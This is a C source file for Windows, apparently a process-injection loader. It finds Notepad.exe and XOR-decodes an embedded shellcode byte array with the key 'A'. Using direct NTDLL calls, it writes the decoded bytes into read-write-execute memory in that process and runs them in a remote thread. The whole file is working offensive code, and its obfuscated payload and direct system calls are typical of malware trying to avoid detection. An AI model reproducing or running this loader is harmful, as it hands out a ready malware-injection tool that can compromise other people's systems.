#include "iHeaders.h"

DWORD findProc(const char* pName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcSnap;
    DWORD pID;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcSnap, &pe32)) {
        error("Failed Filling Struct");
        CloseHandle(hProcSnap);
        return 0;
    }

    do {
        if (strcmp(pe32.szExeFile, pName) == 0) {
            pID = pe32.th32ProcessID;
            break;
        }
    } while(Process32Next(hProcSnap, &pe32));
    return pID;
    CloseHandle(hProcSnap);
}

unsigned char code[] = 
"\xbd\x09\xc2\xa5\xb1\xa9\x81\x41\x41\x41\x00\x10\x00"
"\x11\x13\x10\x17\x09\x70\x93\x24\x09\xca\x13\x21\x09"
"\xca\x13\x59\x09\xca\x13\x61\x09\xca\x33\x11\x09\x4e"
"\xf6\x0b\x0b\x0c\x70\x88\x09\x70\x81\xed\x7d\x20\x3d"
"\x43\x6d\x61\x00\x80\x88\x4c\x00\x40\x80\xa3\xac\x13"
"\x00\x10\x09\xca\x13\x61\xca\x03\x7d\x09\x40\x91\xca"
"\xc1\xc9\x41\x41\x41\x09\xc4\x81\x35\x26\x09\x40\x91"
"\x11\xca\x09\x59\x05\xca\x01\x61\x08\x40\x91\xa2\x17"
"\x09\xbe\x88\x00\xca\x75\xc9\x09\x40\x97\x0c\x70\x88"
"\x09\x70\x81\xed\x00\x80\x88\x4c\x00\x40\x80\x79\xa1"
"\x34\xb0\x0d\x42\x0d\x65\x49\x04\x78\x90\x34\x99\x19"
"\x05\xca\x01\x65\x08\x40\x91\x27\x00\xca\x4d\x09\x05"
"\xca\x01\x5d\x08\x40\x91\x00\xca\x45\xc9\x09\x40\x91"
"\x00\x19\x00\x19\x1f\x18\x1b\x00\x19\x00\x18\x00\x1b"
"\x09\xc2\xad\x61\x00\x13\xbe\xa1\x19\x00\x18\x1b\x09"
"\xca\x53\xa8\x16\xbe\xbe\xbe\x1c\x09\xfb\x40\x41\x41"
"\x41\x41\x41\x41\x41\x09\xcc\xcc\x40\x40\x41\x41\x00"
"\xfb\x70\xca\x2e\xc6\xbe\x94\xfa\xb1\xf4\xe3\x17\x00"
"\xfb\xe7\xd4\xfc\xdc\xbe\x94\x09\xc2\x85\x69\x7d\x47"
"\x3d\x4b\xc1\xba\xa1\x34\x44\xfa\x06\x52\x33\x2e\x2b"
"\x41\x18\x00\xc8\x9b\xbe\x94\x22\x20\x2d\x22\x6f\x24"
"\x39\x24\x41\x41";

int main(int argc, char* argv[]) {
    NTSTATUS          status;
    DWORD             pID          = 0;
    PVOID             rBuffer      = NULL;
    HANDLE            hProc        = NULL;
    HANDLE            hThread      = NULL;
    HMODULE           hNTDLL       = NULL;
    size_t code_len = sizeof(code);
    size_t bytes_ret = 0;
    const char* pName = "Notepad.exe";

    pID = findProc(pName);

    if (pID == 0) {
        error("Failed Program");
        return EXIT_FAILURE;
    }
    
    OBJECT_ATTRIBUTES OA           = { sizeof(OA), NULL };
    CLIENT_ID         CID          = { (HANDLE)pID, NULL };
    char key = 'A';
    

    for (int i = 0; i < code_len; i++) {
        code[i] = code[i] ^ key;
    }
    info("Loading DLL...");
    if ((hNTDLL = GetModuleHandleW(L"NTDLL")) == NULL) {
        error("Failed Loading Module\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Loaded DLL\n\\___0x%p\n", hNTDLL);

    info("Loading Needed Functions...");
    _func_NtOpenProcess pOpenProc = (_func_NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    info("Loaded OpenProcess\n\\____0x%p\n", pOpenProc);

    _func_NtAllocateVirtualMemory pVirtualAlloc = (_func_NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    info("Loaded AllocateMemory\n\\_____0x%p\n", pVirtualAlloc);

    _func_NtWriteVirtualMemory pWriteProc = (_func_NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    info("Loaded WriteMemory\n\\______0x%p\n", pWriteProc);

    _func_NtCreateThreadEx pCreateThread = (_func_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    info("Loaded CreateThread\n\\_______0x%p\n", pCreateThread);

    _func_NtWaitForSingleObject pWait = (_func_NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
    info("Loaded WaitForObject\n\\_______0x%p\n", pWait);
    okay("Loaded All Function Address!\n");

    info("getting a handle to the process (%ld)", pID); 
    status = pOpenProc(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
    if (status != STATUS_SUCCESS) {
        error("Failed Getting Handle\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Got Handle\n\\____0x%p\n", hProc);

    info("Allocating Memory...");
    status = pVirtualAlloc(hProc, &rBuffer, 0, &code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        error("Failed Getting Handle\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("[RWX] Allocted a Buffer Of %d-Bytes\n\\____0x%p\n", code_len, rBuffer);

    info("Writing Memory...");
    status = pWriteProc(hProc, rBuffer, code, code_len, &bytes_ret);
    if (status != STATUS_SUCCESS) {
        error("Failed Getting Handle\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Wrote %d-Bytes\n", bytes_ret);

    info("Starting Thread...");
    status = pCreateThread(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        error("Failed Getting Handle\tCode: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Started Thread, Waiting For Finish...");

    status = pWait(hThread, FALSE, NULL);

    CloseHandle(hThread);
    CloseHandle(hProc);

    return EXIT_SUCCESS;

}